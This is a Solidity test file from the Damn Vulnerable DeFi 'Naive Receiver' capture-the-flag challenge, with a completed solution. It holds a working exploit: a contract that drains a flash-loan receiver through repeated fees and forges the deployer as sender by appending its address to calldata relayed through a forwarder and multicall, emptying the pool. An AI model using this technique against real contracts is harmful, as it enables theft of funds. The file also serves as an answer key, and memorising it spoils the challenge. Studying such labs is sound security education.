// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {EIP712} from "solady/utils/EIP712.sol";
import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        Rescuer rescuer = new Rescuer( forwarder, pool, weth, receiver);

        bytes memory dataWithdraw = abi.encodeWithSignature(
            "withdraw(uint256,address)",
            WETH_IN_POOL + WETH_IN_RECEIVER,
            payable(recovery)
        );

        // 🚨 Smumgle the `deployer` address into the calldata for the withdraw function.
        // This is possible because how these two functions works together:
        // BasicForwarder.execute
        // - appends the signer (attacker) address to the calldata, in this case appended to the calldata of `Multicall.multicall` which simply gets ignored
        // Multicall.multicall
        // - uses delegatecall which preserves the msg.sender. In the attack it's the forwarder
        // - this funciton itself does not check who is the real sender (BasicForwarder.request.from)
        dataWithdraw = abi.encodePacked(dataWithdraw, deployer);

        bytes[] memory dataMulticall = new bytes[](1);
        dataMulticall[0] = dataWithdraw;


        bytes memory data = abi.encodeWithSignature("multicall(bytes[])", dataMulticall);

        BasicForwarder.Request memory request = BasicForwarder.Request(
                                                                       player,           // from
                                                                       address(pool),    // target
                                                                       uint256(0),       //value
                                                                       uint256(2000000), // gas limit
                                                                       0,                // nonce
                                                                       data,             // calldata to target
                                                                       33333333          // deadline
        );

        bytes32 requestHash = rescuer.hashTypedData(
            forwarder.getDataHash(request)
        );

        (uint8 v, bytes32 r, bytes32 s)  = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // address signer = ecrecover(requestHash, v, r, s);
        // assertEq(signer, player, "Invalid signer");

        rescuer.rescue(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}

contract Rescuer is EIP712{
    BasicForwarder forwarder;
    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;

    constructor(BasicForwarder _forwarder,
                NaiveReceiverPool _pool,
                WETH _weth,
                FlashLoanReceiver _receiver) {
        forwarder = _forwarder;
        pool = _pool;
        weth = _weth;
        receiver = _receiver;
    }

    function rescue(BasicForwarder.Request calldata request, bytes calldata signature) public{
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(
                           receiver,
                           address(weth),
                           10 ether, // WETH_IN_RECEIVER
                           bytes("")
            );
        }

        bool success = forwarder.execute(request, signature);
    }

    // --------------------------------------------------------------------------------
    // The following functions are just for getting the same hash as from BasicForwarder._hashTypedData
    function hashTypedData(bytes32 structHash) public view virtual returns (bytes32 digest) {
        digest = buildDomainSeparator();
        assembly {
            // Compute the digest.
            mstore(0x00, 0x1901000000000000) // Store "\x19\x01".
            mstore(0x1a, digest) // Store the domain separator.
            mstore(0x3a, structHash) // Store the struct hash.
            digest := keccak256(0x18, 0x42)
            // Restore the part of the free memory slot that was overwritten.
            mstore(0x3a, 0)
        }
    }

    // copied and edited from src/utils/EIP712.sol
    function buildDomainSeparator() public view returns (bytes32 separator) {
        (string memory name, string memory version) = _domainNameAndVersion();
        separator = keccak256(bytes(name));
        bytes32 versionHash = keccak256(bytes(version));
        address forwarderAddress = address(forwarder);

        assembly {
            let m := mload(0x40) // Load the free memory pointer.
            mstore(m, _DOMAIN_TYPEHASH)
            mstore(add(m, 0x20), separator) // Name hash.
            mstore(add(m, 0x40), versionHash)
            mstore(add(m, 0x60), chainid())
            mstore(add(m, 0x80), forwarderAddress)
            separator := keccak256(m, 0xa0)
        }
    }

    function _domainNameAndVersion() internal pure override returns (string memory name, string memory version) {
        name = "BasicForwarder";
        version = "1";
    }


}
